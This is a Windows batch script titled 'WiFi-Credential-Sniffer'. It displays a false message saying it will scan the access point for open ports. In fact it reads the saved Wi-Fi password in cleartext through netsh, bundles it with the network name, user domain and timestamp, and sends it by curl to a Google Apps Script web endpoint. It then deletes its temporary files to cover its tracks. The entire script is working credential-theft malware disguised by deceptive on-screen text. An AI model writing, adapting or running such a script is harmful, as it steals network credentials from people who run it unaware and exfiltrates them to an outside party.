@echo off
title WiFi-Credential-Sniffer
color a
cls
net session | find "There are no entries in the list"
cls
if not errorlevel 1 echo ADMIN ACCESS PRIVILEGED!
if errorlevel 1 GOTO CHECK2
ping localhost -n 3 > nul
ping -n 1 www.google.com | find "Reply from"
cls
if not errorlevel 1 echo INTERNET IS DETECTED!
if errorlevel 1 GOTO CHECK
cls
echo Confirming Active Wireless Interface......
ping localhost -n 2 > nul
cls
echo The Below Given 'Active-WiFi-Access-Point' Will Now Be Scanned For Open/Unsecure Ports Over The Default Gateway!
echo.
netsh wlan show interface | findstr /C:"SSID                   :"
echo.

ping localhost -n 3 > nul

netsh wlan show interface | findstr /C:"SSID                   :">>wifiname.mushahid
set /p First=<wifiname.mushahid
netsh wlan show profiles "%First:~29%" key=clear | findstr "Key">>wifipassword.mushahid
set /p Second=<wifipassword.mushahid
set newvar=WiFiName Is [[%First:~29%]] And WiFiCode Is [[%Second:~29%]] From [[%userdomain%]] @ Time = [[%time%]] AND Date = [[%date%]]
cls

REM The given below is an example. You need the "Google App Script URL(LINK) to run your own program. 
REM curl --header "Content-Type: application/json" -d "{\"first\":\"RouterCredentials\",\"second\":\"%newvar%\"}" "https://script.google.com/macros/s/AKfycbwSGuUu3lxTrDuCwAaMvVYnWTQWMx6PkOiLze-OVtg-tCUuZgyD_UM8-AKiEiLUmP4Z/exec"

REM Above given example describes the fake URL and a structure of how to use the sniffer. Create the URL and paste it in the below given section.
curl --header "Content-Type: application/json" -d "{\"first\":\"RouterCredentials\",\"second\":\"%newvar%\"}" "YOUR GOOGLE APP SCRIPT LINK"
cls

del wifiname.mushahid
del wifipassword.mushahid
cls

exit

:CHECK
echo INTERNET IS NOT DETECTED! TRY OPENING THE APPLICATION WITH AN ACTIVE INTERNET CONNECTION AGAIN!
ping localhost -n 6 > nul
exit

:CHECK2
echo YOU ARE NOT AN ADMIN! TRY OPENING THE APPLICATION WITH ADMINISTRATIVE PRIVILEGES!(Run As Admin Mode)
ping localhost -n 6 > nul
exit